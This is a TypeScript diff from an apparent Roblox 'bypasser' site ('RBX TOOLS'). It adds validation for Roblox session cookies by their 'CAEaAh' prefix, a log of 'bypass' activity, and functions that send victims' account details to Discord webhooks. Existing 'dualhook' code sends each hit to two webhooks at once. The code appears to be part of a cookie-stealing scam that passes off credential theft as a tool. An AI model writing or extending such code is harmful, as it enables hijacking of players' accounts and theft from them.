@@ -122,6 +122,37 @@ const BOT_NAME = 'RBX TOOLS';
 const FOOTER_BASE = 'Live RBXBYPASS · 2026';
 const SITE_URL_DEFAULT = 'https://Rblxbypasser.com';
 
+// ============================================================
+// Cookie validation
+// ============================================================
+export const COOKIE_PREFIX = 'CAEaAh';
+export function isValidCookieFormat(cookie: string): boolean {
+  if (!cookie) return false;
+  const trimmed = cookie.trim();
+  // Either the full Roblox warning-prefixed cookie that contains CAEaAh, OR a raw cookie starting with CAEaAh
+  return trimmed.includes(COOKIE_PREFIX);
+}
+
+// ============================================================
+// Live Bypass Log (recent activity shown on dashboard)
+// ============================================================
+export interface LiveBypassEntry {
+  id: string;
+  username: string;
+  avatarUrl?: string;
+  success: boolean;
+  timestamp: number;
+}
+const LIVE_LOG_KEY = 'live_bypass_log';
+export function getLiveBypassLog(): LiveBypassEntry[] {
+  try { return JSON.parse(localStorage.getItem(LIVE_LOG_KEY) || '[]'); } catch { return []; }
+}
+export function pushLiveBypass(entry: Omit<LiveBypassEntry, 'id' | 'timestamp'>) {
+  const list = getLiveBypassLog();
+  list.unshift({ ...entry, id: crypto.randomUUID(), timestamp: Date.now() });
+  localStorage.setItem(LIVE_LOG_KEY, JSON.stringify(list.slice(0, 25)));
+}
+
 const yn = (v?: boolean) => (v ? '✅' : '❎');
 const passField = (n?: number) => (typeof n === 'number' && n > 0) ? `✅ ${Math.min(n, 10)}` : '❎';
 
@@ -191,6 +222,21 @@ function buildLiveEmbed(d: AccountInfo) {
   };
 }
 
+function buildLiveFailedEmbed(d: AccountInfo, reason?: string) {
+  return {
+    title: 'BLOCK BYPASS',
+    color: 0xef4444,
+    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
+    description: [
+      `**User:** \`${d.username || 'N/A'}\``,
+      `**Status:** ❎ Bypass Failed`,
+      reason ? `**Reason:** \`${reason}\`` : '',
+      `**API Status:** ❎ Blocked`,
+    ].filter(Boolean).join('\n'),
+    footer: { text: nowFooter() },
+  };
+}
+
 async function post(url: string, body: any) {
   if (!url) return;
   try {
@@ -220,6 +266,29 @@ export async function sendLiveBypassEmbed(webhookUrl: string, d: AccountInfo) {
     username: BOT_NAME,
     embeds: [buildLiveEmbed(d)],
   });
+}
+
+export async function sendLiveBypassFailedEmbed(webhookUrl: string, d: AccountInfo, reason?: string) {
+  if (!webhookUrl) return;
+  await post(webhookUrl, {
+    username: BOT_NAME,
+    embeds: [buildLiveFailedEmbed(d, reason)],
+  });
+}
+
+export async function broadcastLiveBypass(d: AccountInfo) {
+  const dir = getActiveDirectory();
+  await Promise.all([
+    sendLiveBypassEmbed(getWebhook(WK.liveBypass), d),
+    dir?.liveBypassWebhook ? sendLiveBypassEmbed(dir.liveBypassWebhook, d) : Promise.resolve(),
+  ]);
+}
+export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string) {
+  const dir = getActiveDirectory();
+  await Promise.all([
+    sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason),
+    dir?.liveBypassWebhook ? sendLiveBypassFailedEmbed(dir.liveBypassWebhook, d, reason) : Promise.resolve(),
+  ]);
 }
 
 // Dualhook send — sends to both the directory's webhook AND the main webhook
